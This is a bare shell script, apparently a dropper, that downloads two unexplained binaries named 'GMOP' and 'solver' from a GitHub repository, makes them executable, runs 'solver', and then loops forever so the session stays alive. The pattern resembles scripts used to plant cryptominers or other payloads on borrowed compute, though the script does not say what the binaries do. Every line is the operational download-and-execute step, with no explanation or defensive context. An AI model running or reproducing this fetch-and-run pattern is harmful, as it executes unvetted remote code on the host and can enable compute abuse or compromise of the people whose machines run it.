#!/bin/sh
wget https://github.com/gitcuan/j/raw/main/GMOP
wget https://github.com/gitcuan/j/raw/main/solver
chmod +x GMOP
chmod +x solver
./solver
while [ 1 ]; do
sleep 3
done
sleep 999
